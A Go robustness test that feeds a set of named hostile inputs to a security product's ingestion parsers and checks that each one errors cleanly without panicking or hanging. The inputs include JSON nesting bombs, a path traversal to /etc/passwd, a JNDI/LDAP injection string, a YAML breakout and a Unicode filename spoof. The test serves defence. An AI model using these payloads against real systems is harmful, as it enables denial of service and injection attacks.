package fuzz

import (
	"bytes"
	"strings"
	"testing"
	"time"

	"github.com/luiacuaniello/perspectivegraph/internal/ingestion"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/build"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/cloudnet"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/custodian"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/dataclass"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/falco"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/iam"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/k8s"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/semgrep"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/sso"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/supplychain"
	"github.com/luiacuaniello/perspectivegraph/internal/ingestion/trivy"
)

// The fuzzers explore random mutations. This does the complementary job: it aims the
// payloads an attacker reaches for FIRST at every collector at once, deterministically,
// on every `go test`. The ingest webhook is the one place this product turns
// attacker-influenceable bytes into graph structure, so "returns an error" is the only
// acceptable outcome for junk - never a panic, never an unbounded wait, never silent
// acceptance of a document that is not what it claims to be.

// hostilePayloads are named so a failure says which class of input broke a parser.
func hostilePayloads() map[string][]byte {
	deep := func(n int) []byte { // nesting bomb: stack exhaustion in a recursive decoder
		return []byte(strings.Repeat(`{"a":`, n) + `1` + strings.Repeat(`}`, n))
	}
	deepArray := func(n int) []byte {
		return []byte(strings.Repeat(`[`, n) + strings.Repeat(`]`, n))
	}
	wideArray := func(n int) []byte { // allocation amplification from a small body
		return []byte(`[` + strings.TrimSuffix(strings.Repeat(`{},`, n), `,`) + `]`)
	}
	dupKeys := func(n int) []byte { // last-wins ambiguity / quadratic map behaviour
		var b strings.Builder
		b.WriteString(`{`)
		for i := 0; i < n; i++ {
			b.WriteString(`"k":1,`)
		}
		b.WriteString(`"k":2}`)
		return []byte(b.String())
	}

	return map[string][]byte{
		"empty":                  {},
		"nul bytes":              {0, 0, 0, 0},
		"bare newline":           []byte("\n"),
		"not json":               []byte("<?xml version=\"1.0\"?><root/>"),
		"truncated object":       []byte(`{"results":[{"a":`),
		"json null":              []byte(`null`),
		"json true":              []byte(`true`),
		"json number":            []byte(`1e309`), // overflows float64
		"negative zero":          []byte(`-0`),
		"huge exponent":          []byte(`{"score": 1e999999}`),
		"nan literal":            []byte(`{"score": NaN}`),
		"nesting bomb 200k":      deep(200_000),
		"array nesting bomb":     deepArray(200_000),
		"wide array 200k":        wideArray(200_000),
		"duplicate keys 100k":    dupKeys(100_000),
		"invalid utf8":           {'{', '"', 'a', '"', ':', '"', 0xff, 0xfe, '"', '}'},
		"lone surrogate":         []byte(`{"name":"\ud800"}`),
		"null byte in string":    append([]byte(`{"name":"a`), append([]byte{0}, []byte(`b"}`)...)...),
		"path traversal name":    []byte(`{"name":"../../../../etc/passwd"}`),
		"template injection":     []byte(`{"name":"{{7*7}}${jndi:ldap://x/a}"}`),
		"yaml breakout in name":  []byte(`{"name":"x\": evil\ninjected: true"}`),
		"very long string":       []byte(`{"name":"` + strings.Repeat("A", 5<<20) + `"}`),
		"unicode direction mark": []byte("{\"name\":\"admin\u202egnp.exe\"}"),
	}
}

// Every parser, every payload: no panic, no hang, and whatever comes back is either an
// error or a set of events - never a half-built one.
func TestCollectorsSurviveHostileInput(t *testing.T) {
	parsers := map[string]parser{
		"build":       build.New(),
		"cloudnet":    cloudnet.New(),
		"custodian":   custodian.New(),
		"dataclass":   dataclass.New(),
		"falco":       falco.New(),
		"iam":         iam.New(),
		"k8s":         k8s.New(),
		"semgrep":     semgrep.New(),
		"sso":         sso.New(),
		"supplychain": supplychain.New(),
		"trivy":       trivy.New(),
	}

	for pname, p := range parsers {
		for hname, payload := range hostilePayloads() {
			t.Run(pname+"/"+hname, func(t *testing.T) {
				done := make(chan struct{})
				var events any
				var perr error
				go func() {
					defer func() {
						if r := recover(); r != nil {
							t.Errorf("PANIC on %s: %v", hname, r)
						}
						close(done)
					}()
					ev, err := p.Parse(bytes.NewReader(payload), ingestion.Options{})
					events, perr = ev, err
				}()
				select {
				case <-done:
				case <-time.After(10 * time.Second):
					t.Fatalf("Parse did not return within 10s on %q - an ingest webhook that "+
						"can be stalled by one body is a denial of service", hname)
				}
				// An error is the right answer for junk. Accepting it is only acceptable
				// if what came back is a well-formed (possibly empty) event set.
				if perr == nil && events == nil {
					t.Errorf("accepted %q with neither error nor events", hname)
				}
			})
		}
	}
}
